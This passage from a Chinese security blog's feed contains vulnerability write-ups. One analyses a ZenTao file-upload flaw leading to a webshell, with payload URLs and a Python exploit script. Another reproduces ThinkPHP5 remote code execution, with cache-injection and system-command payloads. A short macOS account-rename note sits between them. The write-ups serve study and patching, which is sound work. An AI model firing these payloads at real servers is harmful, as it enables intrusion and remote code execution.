<span class="keyword">$this</span>-&gt;config-&gt;webRoot . $dir . $file;</span><br><span class="line">    &#125;</span><br><span class="line">    ob_clean();</span><br><span class="line">    ob_end_flush();</span><br><span class="line"></span><br><span class="line">    $local  = fopen(<span class="keyword">$this</span>-&gt;app-&gt;wwwRoot . $dir . $file, <span class="string">&#x27;w&#x27;</span>);</span><br><span class="line">    $remote = fopen($link, <span class="string">&#x27;rb&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>($remote === <span class="literal">false</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">while</span>(!feof($remote))</span><br><span class="line">    &#123;</span><br><span class="line">        $buffer = fread($remote, <span class="number">4096</span>);</span><br><span class="line">        fwrite($local, $buffer);</span><br><span class="line">    &#125;</span><br><span class="line">    fclose($local);</span><br><span class="line">    fclose($remote);</span><br><span class="line">    <span class="keyword">return</span> commonModel::getSysURL() . <span class="keyword">$this</span>-&gt;config-&gt;webRoot . $dir . $file;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>downloadZipPackage</code> 方法，获取两个参数，<code>version</code> 和 <code>link</code> ，将第一个参数作为路径中的一部分进行拼接（<code>data/client/ . $version . &#39;/&#39;</code>），第二个参数通过调用<code>safe64Decode</code>方法进行base64解码</p><p><code>/framework/base/helper.class.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">static</span> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">safe64Decode</span>(<span class="params">$string</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> base64_decode(strtr($string, <span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;/&#x27;</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该方法同时去除字符串中的<code>.</code> 和<code>/</code> 来避免<code>目录穿越漏洞</code></p><p>最后用<code>fopen</code> 函数打开远程或本地的文件呢。</p><p>在<code>module/client/ext/model/xuanxuan.php</code> 中，（漏洞函数）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">downloadZipPackage</span>(<span class="params">$version, $link</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $decodeLink = helper::safe64Decode($link);</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^https?\:\/\//&#x27;</span>, $decodeLink)) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">parent</span>::downloadZipPackage($version, $link);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该方法获取两个参数，然后对<code>link</code>参数进行<code>safe64Decode</code>，再判断是否为<code>https/http</code> 协议，如果不是就返回<code>false</code>，注意到这里并没有用<code>/i</code>模式进行匹配，忽略大小写。(<strong>故此处存在大小写bypass</strong>)如果满足if语句，就调用父类的<code>downloadZipPackage</code>方法，下载<code>zip</code>包进行更新。</p><p>在<code>/moudle/client/control.php</code>中的<code>download</code>方法调用了<code>downloadZipPackage</code>方法。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Download remote package.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> string $version</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> string $link</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> string $os</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> string</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">download</span>(<span class="params">$version = <span class="string">&#x27;&#x27;</span>, $link = <span class="string">&#x27;&#x27;</span>, $os = <span class="string">&#x27;&#x27;</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    set_time_limit(<span class="number">0</span>);</span><br><span class="line">    $result = <span class="keyword">$this</span>-&gt;client-&gt;downloadZipPackage($version, $link);</span><br><span class="line">    <span class="keyword">if</span>($result == <span class="literal">false</span>) <span class="keyword">$this</span>-&gt;send(<span class="keyword">array</span>(<span class="string">&#x27;result&#x27;</span> =&gt; <span class="string">&#x27;fail&#x27;</span>, <span class="string">&#x27;message&#x27;</span> =&gt; <span class="keyword">$this</span>-&gt;lang-&gt;client-&gt;downloadFail));</span><br><span class="line">    $client = <span class="keyword">$this</span>-&gt;client-&gt;edit($version, $result, $os);</span><br><span class="line">    <span class="keyword">if</span>($client == <span class="literal">false</span>) <span class="keyword">$this</span>-&gt;send(<span class="keyword">array</span>(<span class="string">&#x27;result&#x27;</span> =&gt; <span class="string">&#x27;fail&#x27;</span>, <span class="string">&#x27;message&#x27;</span> =&gt; <span class="keyword">$this</span>-&gt;lang-&gt;client-&gt;saveClientError));</span><br><span class="line">    <span class="keyword">$this</span>-&gt;send(<span class="keyword">array</span>(<span class="string">&#x27;result&#x27;</span> =&gt; <span class="string">&#x27;success&#x27;</span>, <span class="string">&#x27;client&#x27;</span> =&gt; $client, <span class="string">&#x27;message&#x27;</span> =&gt; <span class="keyword">$this</span>-&gt;lang-&gt;saveSuccess, <span class="string">&#x27;locate&#x27;</span> =&gt; inlink(<span class="string">&#x27;browse&#x27;</span>)));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们去找一下下载文件的入口点。对禅道的路由解析分析</p><p><code>/framework/base/router.class.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 设置路由(GET 方式)：</span></span><br><span class="line"><span class="comment">     * 1.设置模块名；</span></span><br><span class="line"><span class="comment">     * 2.设置方法名；</span></span><br><span class="line"><span class="comment">     * 3.设置控制器文件。</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * Set the route according to GET.</span></span><br><span class="line"><span class="comment">     * 1. set the module name.</span></span><br><span class="line"><span class="comment">     * 2. set the method name.</span></span><br><span class="line"><span class="comment">     * 3. set the control file.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> void</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">setRouteByGET</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $moduleName = <span class="keyword">isset</span>($_GET[<span class="keyword">$this</span>-&gt;config-&gt;moduleVar]) ? strtolower($_GET[<span class="keyword">$this</span>-&gt;config-&gt;moduleVar]) : <span class="keyword">$this</span>-&gt;config-&gt;default-&gt;module;</span><br><span class="line">        $methodName = <span class="keyword">isset</span>($_GET[<span class="keyword">$this</span>-&gt;config-&gt;methodVar]) ? strtolower($_GET[<span class="keyword">$this</span>-&gt;config-&gt;methodVar]) : <span class="keyword">$this</span>-&gt;config-&gt;default-&gt;method;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;setModuleName($moduleName);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;setMethodName($methodName);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;setControlFile();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>以及<code>setFlowURI</code>方法</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210116000856.png"></p><p>从注释中可以知道，如果为<code>download</code>那么下载的URI则为：</p><p><code>$module-download-1.html</code></p><p>于是构造payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;zentaopms:8890&#x2F;www&#x2F;client-download-1-SFRUUDovLzE5Mi4xNjguMjI2LjEyOS9waHBpbmZvLnBocA&#x3D;&#x3D;-1.html</span><br></pre></td></tr></table></figure><p>这里我本地环境不知道为什么原因，上传成功后不像网上的文章能够直接得到回显。我就一直认为是没有复现成功。</p><p>结果在目录下是上传成功了的。如下图：</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210116000921.png"></p><p>访问WebShell：</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210116000951.png"></p><p>所以通过代码层面理解了漏洞原理之后，没有回显出地址也一样GetShell，问题不大。</p><h2 id="利用方法二"><a href="#利用方法二" class="headerlink" title="利用方法二"></a>利用方法二</h2><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">m&#x3D;client&amp;f&#x3D;download&amp;version&#x3D;233&amp;link&#x3D;SFRUUDovLzE5Mi4xNjguMjI2LjEyOS9waHBpbmZvLnBocA&#x3D;&#x3D;</span><br></pre></td></tr></table></figure><p>利用方法二和方法一的区别就是路由。禅道的两种路由解析方式。</p><p>这里看这位师傅的分析文章：</p><p><a href="https://www.windylh.com/2020/10/28/CNVD-C-2020-121325%EF%BC%9A%E7%A6%85%E9%81%93%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/">https://www.windylh.com/2020/10/28/CNVD-C-2020-121325%EF%BC%9A%E7%A6%85%E9%81%93%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/</a></p><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>分析完之后，一句话总结漏洞原理。</p><blockquote><p>源码未对远程下载的文件进行拓展名合法性校验，if判断大写绕过，并且上传之后的文件名路径已知，导致GetShell。</p></blockquote><h1 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">usage = <span class="string">&quot;&quot;&quot;Usage example:</span></span><br><span class="line"><span class="string">python3  CNVD-C-2020-121325.py -t http://www.target.com -p 1 -rs remoteshell -m 1</span></span><br><span class="line"><span class="string">result maybe: http://www.target.com/www/data/client/1/phpinfo.php</span></span><br><span class="line"><span class="string">author: m0nk3y</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">target = sys.argv[<span class="number">2</span>]</span><br><span class="line">version = sys.argv[<span class="number">4</span>]</span><br><span class="line">remoteshell = sys.argv[<span class="number">6</span>]  <span class="comment"># your remote shell uri in base64encode format</span></span><br><span class="line">mode = sys.argv[<span class="number">8</span>]</span><br><span class="line">payload1 = <span class="string">&#x27;www/client-download-&#123;&#125;-&#123;&#125;.html&#x27;</span>.format(version, remoteshell)</span><br><span class="line">payload2 = <span class="string">&#x27;www/index.php?m=client&amp;f=download&amp;version=&#123;&#125;&amp;link=&#123;&#125;&#x27;</span>.format(</span><br><span class="line">    version, remoteshell)</span><br><span class="line">header = &#123;<span class="string">&quot;Cookie&quot;</span>: <span class="string">&quot;zentaosid=6d5fd22002d28df1a2001411a4d4e6d1&quot;</span>,</span><br><span class="line">          <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36 Edg/84.0.522.63&quot;</span>&#125;</span><br><span class="line"><span class="keyword">if</span> mode == <span class="number">1</span>:</span><br><span class="line">    target = target + payload1</span><br><span class="line">    print(target)</span><br><span class="line">r = requests.get(target, headers=header)</span><br><span class="line"><span class="keyword">if</span> mode == <span class="number">2</span>:</span><br><span class="line">    target = target + payload2</span><br><span class="line">    print(target)</span><br><span class="line">    r = requests.get(target, headers=header)</span><br><span class="line">    print(r.text)</span><br><span class="line">    target = target + <span class="string">&quot;/www/data/client/&#123;&#125;/phpinfo.php&quot;</span>.format(version)</span><br><span class="line">    checker = requests.get(target)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;phpinfo&#x27;</span> <span class="keyword">in</span> checker.text:</span><br><span class="line">        print(<span class="string">&quot;GetShell [+]!your webshell is:&#123;&#125;&quot;</span>.format(target))</span><br></pre></td></tr></table></figure><blockquote><p>待完善。</p></blockquote><p>其实感觉这个洞，写脚本每啥意思，因为本来就在后台上的东西，也没办法批量。在满足利用条件的前提下，手动复现也就两三步就GetShell了。</p><h1 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h1><p>升级禅道到最新安全版本</p><p>AWD中如何修复：参考官方的做法，加一个扩展名检验。</p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://cert.360.cn/warning/detail?id=ace6901fc02100078ce586ffe53d4cfb">https://cert.360.cn/warning/detail?id=ace6901fc02100078ce586ffe53d4cfb</a></p><p><a href="https://co0ontty.github.io/2020/10/27/zentao.html">https://co0ontty.github.io/2020/10/27/zentao.html</a></p><p><a href="https://www.windylh.com/2020/10/28/CNVD-C-2020-121325%EF%BC%9A%E7%A6%85%E9%81%93%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/">https://www.windylh.com/2020/10/28/CNVD-C-2020-121325%EF%BC%9A%E7%A6%85%E9%81%93%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/</a></p><p>非常推荐：<a href="https://www.secpulse.com/archives/149812.html">https://www.secpulse.com/archives/149812.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;漏洞背景&quot;&gt;&lt;a href=&quot;#漏洞背景&quot; class=&quot;headerlink&quot; title=&quot;漏洞背景&quot;&gt;&lt;/a&gt;漏洞背景&lt;/h1&gt;&lt;p&gt;禅道是第一款国产的开源项目管理软件，其使用zentaophp框架开发，内置了测试管理、计划管理、发布管理、文档管理、事务管理</summary>
      
    
    
    
    
    <category term="代码审计" scheme="https://hack-for.fun/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>MacOS 如何修改账户名</title>
    <link href="https://hack-for.fun/63e5.html"/>
    <id>https://hack-for.fun/63e5.html</id>
    <published>2020-10-17T16:01:49.000Z</published>
    <updated>2020-10-17T16:13:31.788Z</updated>
    
    <content type="html"><![CDATA[<p>之前激活MacBook Pro的时候，本来打算拿回家激活的，但是太古里Apple的人员太热情啦，我就在小姐姐哪里激活了，一顿下一步，导致了我的用户名是我的真名。有时候写笔记、文章啥的，总感觉不舒服。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20201018000438.png" alt="image-20201018000436765"></p><p>然后之前一直想修改，但是哪里是灰色的，无法修改。</p><p>修改后：</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20201018000535.png" alt="image-20201018000534179"></p><p>修改方法：</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20201018000610.png" alt="image-20201018000608993"></p><p>点击锁，输入密码之后就可以进行操作了。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20201018000635.png" alt="image-20201018000633434"></p><p>然后点击 + 号，新建一个管理员用户。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20201018000720.png" alt="image-20201018000719065"></p><ul><li>退出当前登录的用户（也是因为当前这个用户是处于登录状态，所以无法直接修改account name。</li><li>登录创建的test 管理员账号，直接跳过Apple ID 之类的设置，然后去修改account name。</li><li>切换回来就OK了。</li><li>删除创建的test 管理员用户。</li></ul><p>原来这样简单。</p><blockquote><p>其实很多事情，或许都简单，只是在于自己愿不愿意去做。</p></blockquote><p>最近也是心神不定的，好好学习嘛！Docker 逃逸好几种方法都没复现成功，淦。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;之前激活MacBook Pro的时候，本来打算拿回家激活的，但是太古里Apple的人员太热情啦，我就在小姐姐哪里激活了，一顿下一步，导致了我的用户名是我的真名。有时候写笔记、文章啥的，总感觉不舒服。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://cdn.jsdelivr</summary>
      
    
    
    
    
    <category term="杂碎" scheme="https://hack-for.fun/tags/%E6%9D%82%E7%A2%8E/"/>
    
  </entry>
  
  <entry>
    <title>ThinkPHP5漏洞学习-RCE</title>
    <link href="https://hack-for.fun/a45.html"/>
    <id>https://hack-for.fun/a45.html</id>
    <published>2020-09-23T03:04:09.000Z</published>
    <updated>2021-03-25T13:21:18.631Z</updated>
    
    <content type="html"><![CDATA[<p>主要参考资料：</p><p><a href="https://github.com/Mochazz/ThinkPHP-Vuln/">https://github.com/Mochazz/ThinkPHP-Vuln/</a></p><h1 id="RCE1-利用缓存文件GetShell从而RCE"><a href="#RCE1-利用缓存文件GetShell从而RCE" class="headerlink" title="RCE1(利用缓存文件GetShell从而RCE)"></a>RCE1(利用缓存文件GetShell从而RCE)</h1><p>相关参考资料：<a href="https://www.cnblogs.com/zpchcbd/p/12546340.html">https://www.cnblogs.com/zpchcbd/p/12546340.html</a></p><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;thinkphp5:8888&#x2F;public&#x2F;?username&#x3D;test%0d%0a@eval($_GET[_]);&#x2F;&#x2F;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200923172609.png" alt="image-20200923114608784"></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200923172619.png" alt="image-20200923124814752"></p><h2 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h2><blockquote><p>漏洞存在于 <strong>ThinkPHP</strong> 的缓存类中。该类会将缓存数据通过序列化的方式，直接存储在 <code>.php</code> 文件中，攻击者通过精心构造的 <strong>payload</strong> ，即可将 <strong>webshell</strong> 写入缓存文件。缓存文件的名字和目录均可预测出来，一旦缓存目录可访问或结合任意文件包含漏洞，即可触发 <strong>远程代码执行漏洞</strong> 。</p></blockquote><p>漏洞利用前提：</p><ul><li><p>站点能够将缓存文件列出，并且用户可以得到路径</p></li><li><p>1、缓存使用文件方式并且缓存目录暴露在web目录下面<br>2、攻击者要能猜到开发者使用的缓存key</p></li><li><p>知道缓存类所设置的键名，这样才能找到 <strong>webshell</strong> 路径；其次如果按照官方说明开发程序， <strong>webshell</strong> 最终会被写到 <strong>runtime</strong> 目录下，而官方推荐 <strong>public</strong> 作为 <strong>web</strong> 根目录，所以即便我们写入了 <strong>shell</strong> ，也无法直接访问到；最后如果程序有设置 <strong>$this-&gt;options[‘prefix’]</strong> 的话，在没有源码的情况下，我们还是无法获得 <strong>webshell</strong> 的准确路径。</p></li><li><blockquote><p>5.0的部署建议是public目录作为web目录访问内容，其它都是web目录之外，当然，你必须要修改public/index.php中的相关路径</p></blockquote></li></ul><p>比如这里修改的index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">index</span>\<span class="title">controller</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Cache</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        Cache::set(<span class="string">&quot;name&quot;</span>,input(<span class="string">&quot;get.username&quot;</span>));</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Cache success&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p><strong>5.0.0&lt;=ThinkPHP5&lt;=5.0.10</strong></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>在ThinkPHP 的5.0.11 release 信息中：</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200923172420.png" alt="image-20200923125619050"></p><p>更新了完善缓存驱动(安全更新)。再去查看commit记录。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200923160412.png" alt="image-20200923130139007"></p><p>修复方式为将缓存文件的内容拼接到<code>&lt;?php ?&gt;</code> 标签之外，并且使用了<code>exit()</code>函数来退出当前脚本。</p><p>可下断点进行单步调试，观察整个参数在Cache类以及Request类下进过相关方法的过滤，转换，并最终写入了缓存文件的过程。</p><p>首先是<code>Cache::set(&quot;name&quot;,input(&quot;get.username&quot;));</code> 未实例化，所以为调用<code>autoload</code>方法，自动加载机制来进行一系列实例化操作。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200923172411.png" alt="image-20200923161825336"></p><p>然后到helper.php 中的 <code>input</code>方法，判断请求的方法和请求的参数，此处为<code>get.username</code></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200923172318.png" alt="image-20200923162505424"></p><p>然后返回过滤后的值，继续调用<code>Request</code> 类的 <code>get</code> 方法和 <code>Input</code> 方法（在TP5)中参数的处理都是这样的了，</p><p>经过<code>filterVaule</code>和<code>filterExp</code>函数进行特殊字符过滤和相关判段后返回给<code>$data</code></p><hr><p>然后来到Cache 类的<code>set</code>方法。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200923172308.png" alt="image-20200923164241136"></p><p>调用了Cache 类的init 方法，该方法继续调用了 Config里的get方法，这些操作是在为缓存内容做一些初始化操作。然后再到Cache 类的 connect 方法，</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200923172114.png" alt="image-20200923164824257"></p><p>为缓存文件的文件名进行md5返回。这里的<code>self::handler</code>为<code>think\cache\driver\File</code>类。所以会调用<code>File</code>类的<code>set</code>方法。该方法调用了<code>getCacheKey</code>方法来获取缓存文件的文件名。文件名的机制如下图，先是对<code>$name</code> md5，然后截取前两位作为目录名，后面部分作为文件名然后和<code>.php</code>后缀进行拼接。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200923172102.png" alt="image-20200923165836437"></p><p>看看set方法的处理流程：</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200923172037.png" alt="image-20200923170741256"></p><p>最后通过<code>file_put_contents</code>函数，将<code>$data</code>（参数内容可控，并且没有对data参数进行任何过滤等操作，只是序列化后拼接存储在文件中，这里的 <strong>$this-&gt;options[‘data_compress’]</strong> 变量默认情况下为 <strong>false</strong> ，所以数据不会经过 <strong>gzcompress</strong> 函数处理。虽然在序列化数据前面拼接了单行注释符 <strong>//</strong> ，但是我们可以通过注入换行符绕过该限制。） 写入<code>$filename</code>从而GetShell。</p><blockquote><p>最后如果程序有设置 <strong>$this-&gt;options[‘prefix’]</strong> 的话(也就是上上图中的设置文件名前缀的代码)，在没有源码的情况下，我们还是无法获得 <strong>webshell</strong> 的准确路径。</p></blockquote><h2 id="利用总结"><a href="#利用总结" class="headerlink" title="利用总结"></a>利用总结</h2><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200923173430.png"></p><h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>1，thinkphp3.2的版本请选择开启：DATA_CACHE_KEY 这样就算你使用的cms是开源的人家发现了这个也无法使用。<br>2，tp3.2-tp5  做好目录权限，除公共目录绝对不要让外部可访问</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200923160412.png" alt="image-20200923130139007"></p><h1 id="RCE2-利用任意控制器调用RCE"><a href="#RCE2-利用任意控制器调用RCE" class="headerlink" title="RCE2(利用任意控制器调用RCE)"></a>RCE2(利用任意控制器调用RCE)</h1><blockquote><p>控制器过滤不严，结合直接返回类名的代码操作，导致可以用命名空间的方式来调用任意类的任意方法</p></blockquote><p>获取复现代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer create-project --prefer-dist topthink&#x2F;think&#x3D;5.1.0 tpdemo</span><br></pre></td></tr></table></figure><p>修改composer.json 的  require 字段。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&quot;require&quot;: &#123;</span><br><span class="line">    &quot;php&quot;: &quot;&gt;&#x3D;5.6.0&quot;,</span><br><span class="line">    &quot;topthink&#x2F;framework&quot;: &quot;5.1.30&quot;</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><p>composer update</p><p>相关参考资料：</p><p><strong>感觉自己分析的不好，要学习还是去看参考资料吧。</strong></p><p><a href="https://xz.aliyun.com/t/3570">https://xz.aliyun.com/t/3570</a></p><p><a href="https://www.smi1e.top/thinkphp-5-x-rce-%E5%88%86%E6%9E%90/">https://www.smi1e.top/thinkphp-5-x-rce-%E5%88%86%E6%9E%90/</a></p><h2 id="POC-1"><a href="#POC-1" class="headerlink" title="POC"></a>POC</h2><p><strong>5.1.x</strong> ：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?s&#x3D;index&#x2F;\think\Request&#x2F;input&amp;filter[]&#x3D;system&amp;data&#x3D;pwd</span><br><span class="line">?s&#x3D;index&#x2F;\think\view\driver\Php&#x2F;display&amp;content&#x3D;&lt;?php phpinfo();?&gt;</span><br><span class="line">?s&#x3D;index&#x2F;\think\template\driver\file&#x2F;write&amp;cacheFile&#x3D;shell.php&amp;content&#x3D;&lt;?php phpinfo();?&gt;</span><br><span class="line">?s&#x3D;index&#x2F;\think\Container&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;id</span><br><span class="line">?s&#x3D;index&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;id</span><br></pre></td></tr></table></figure><p><strong>5.0.x</strong> ：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span 